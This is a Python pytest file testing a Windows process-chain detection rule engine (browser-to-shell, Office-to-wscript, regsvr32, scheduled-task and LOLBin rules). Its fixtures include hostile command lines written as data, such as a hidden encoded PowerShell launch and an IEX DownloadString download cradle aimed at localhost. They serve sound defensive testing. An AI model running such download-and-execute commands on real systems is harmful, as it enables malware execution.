"""Phase 4A Subphase 6 — Parent-child rule expansion tests."""

from __future__ import annotations

from pathlib import Path

import pytest
from normalizer.models import ProcessCreateEvent
from rules.engine import RuleEngine

CHROME = r"C:\Program Files\Google\Chrome\Application\chrome.exe"
WINWORD = r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"
REGSVR32 = r"C:\Windows\System32\regsvr32.exe"
TASKHOSTW = r"C:\Windows\System32\taskhostw.exe"
TASKENG = r"C:\Windows\System32\taskeng.exe"
SCHTASKS = r"C:\Windows\System32\schtasks.exe"
SVCHOST = r"C:\Windows\System32\svchost.exe"
MSHTA = r"C:\Windows\System32\mshta.exe"
CMD = r"C:\Windows\System32\cmd.exe"
PS = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
WSCRIPT = r"C:\Windows\System32\wscript.exe"
EXPLORER = r"C:\Windows\explorer.exe"


def _make_process_event(**kwargs) -> ProcessCreateEvent:
    defaults: dict = {
        "event_id": 1,
        "utc_time": "2026-07-07 10:00:00.000",
        "computer": "TEST-HOST",
        "process_guid": "{test-guid}",
        "process_id": 3344,
        "image": CMD,
        "command_line": "cmd.exe",
        "current_directory": "C:\\",
        "user": "TEST-HOST\\User",
        "parent_process_id": 2233,
        "parent_image": EXPLORER,
        "parent_command_line": "explorer.exe",
        "integrity_level": "Medium",
        "hashes": None,
    }
    defaults.update(kwargs)
    return ProcessCreateEvent(**defaults)


def _hits(engine: RuleEngine, event: ProcessCreateEvent, rule_id: str) -> bool:
    return any(h.rule_id == rule_id for h in engine.evaluate(event))


@pytest.fixture(scope="module")
def engine() -> RuleEngine:
    eng = RuleEngine(Path("rules"))
    eng.load()
    return eng


# ---------------------------------------------------------------------------
# CHAIN_BROWSER_SHELL_001
# ---------------------------------------------------------------------------


def test_chain_browser_shell_fires(engine: RuleEngine):
    event = _make_process_event(
        parent_image=CHROME,
        image=CMD,
        command_line="cmd.exe /c whoami",
    )
    assert _hits(engine, event, "CHAIN_BROWSER_SHELL_001")


def test_chain_browser_shell_does_not_fire_on_benign(engine: RuleEngine):
    event = _make_process_event(
        parent_image=EXPLORER,
        image=CMD,
        command_line="cmd.exe /c dir",
    )
    assert not _hits(engine, event, "CHAIN_BROWSER_SHELL_001")


# ---------------------------------------------------------------------------
# CHAIN_OFFICE_WSCRIPT_001
# ---------------------------------------------------------------------------


def test_chain_office_wscript_fires(engine: RuleEngine):
    event = _make_process_event(
        parent_image=WINWORD,
        image=WSCRIPT,
        command_line="wscript.exe C:\\temp\\dropper.vbs",
    )
    assert _hits(engine, event, "CHAIN_OFFICE_WSCRIPT_001")


def test_chain_office_wscript_does_not_fire_on_benign(engine: RuleEngine):
    event = _make_process_event(
        parent_image=EXPLORER,
        image=WSCRIPT,
        command_line="wscript.exe C:\\scripts\\maintenance.vbs",
    )
    assert not _hits(engine, event, "CHAIN_OFFICE_WSCRIPT_001")


# ---------------------------------------------------------------------------
# CHAIN_REGSVR32_CHILD_001
# ---------------------------------------------------------------------------


def test_chain_regsvr32_child_fires(engine: RuleEngine):
    event = _make_process_event(
        parent_image=REGSVR32,
        image=PS,
        command_line="powershell.exe -nop -w hidden -enc SQBFAFgA",
    )
    assert _hits(engine, event, "CHAIN_REGSVR32_CHILD_001")


def test_chain_regsvr32_child_does_not_fire_on_benign(engine: RuleEngine):
    event = _make_process_event(
        parent_image=EXPLORER,
        image=PS,
        command_line="powershell.exe Get-Process",
    )
    assert not _hits(engine, event, "CHAIN_REGSVR32_CHILD_001")


# ---------------------------------------------------------------------------
# CHAIN_SCHEDULED_TASK_SCRIPT_001
# ---------------------------------------------------------------------------


def test_chain_scheduled_task_script_fires(engine: RuleEngine):
    event = _make_process_event(
        parent_image=TASKHOSTW,
        parent_command_line=r"C:\Windows\System32\taskhostw.exe",
        image=WSCRIPT,
        command_line=r"wscript.exe C:\Users\username\stage.vbs",
    )
    assert _hits(engine, event, "CHAIN_SCHEDULED_TASK_SCRIPT_001")


@pytest.mark.parametrize(
    ("parent_image", "parent_command_line"),
    [
        (TASKENG, "not-a-scheduler-marker"),
        (TASKHOSTW, "still-not-a-scheduler-marker"),
    ],
)
def test_chain_scheduled_task_script_original_parents_still_fire(
    engine: RuleEngine, parent_image: str, parent_command_line: str
):
    event = _make_process_event(
        parent_image=parent_image,
        parent_command_line=parent_command_line,
        image=PS,
        command_line=r"wscript.exe C:\ProgramData\payload.vbs",
    )
    assert _hits(engine, event, "CHAIN_SCHEDULED_TASK_SCRIPT_001")


def test_chain_scheduled_task_script_svchost_schedule_fires(engine: RuleEngine):
    event = _make_process_event(
        parent_image=SVCHOST,
        parent_command_line=r"svchost.exe -k netsvcs -p -s Schedule",
        image=PS,
        command_line=(
            "powershell.exe -NoProfile -Command "
            "\"IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1/')\""
        ),
    )
    assert _hits(engine, event, "CHAIN_SCHEDULED_TASK_SVCHOST_001")


def test_chain_scheduled_task_script_svchost_non_schedule_does_not_fire(engine: RuleEngine):
    event = _make_process_event(
        parent_image=SVCHOST,
        parent_command_line=r"svchost.exe -k LocalServiceNetworkRestricted -p -s Dnscache",
        image=PS,
        command_line=(
            "powershell.exe -NoProfile -Command "
            "\"IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1/')\""
        ),
    )
    assert not _hits(engine, event, "CHAIN_SCHEDULED_TASK_SCRIPT_001")
    assert not _hits(engine, event, "CHAIN_SCHEDULED_TASK_SVCHOST_001")


def test_chain_scheduled_task_script_does_not_fire_on_benign(engine: RuleEngine):
    event = _make_process_event(
        parent_image=TASKHOSTW,
        parent_command_line=r"C:\Windows\System32\taskhostw.exe",
        image=WSCRIPT,
        command_line="wscript.exe C:\\Windows\\System32\\cleanup.vbs",
    )
    assert not _hits(engine, event, "CHAIN_SCHEDULED_TASK_SCRIPT_001")


# ---------------------------------------------------------------------------
# CHAIN_LOLBIN_CHILD_001
# ---------------------------------------------------------------------------


def test_chain_lolbin_child_fires(engine: RuleEngine):
    event = _make_process_event(
        parent_image=MSHTA,
        image=CMD,
        command_line="cmd.exe /c whoami",
    )
    assert _hits(engine, event, "CHAIN_LOLBIN_CHILD_001")


def test_chain_lolbin_child_does_not_fire_on_benign(engine: RuleEngine):
    event = _make_process_event(
        parent_image=EXPLORER,
        image=CMD,
        command_line="cmd.exe /c dir",
    )
    assert not _hits(engine, event, "CHAIN_LOLBIN_CHILD_001")
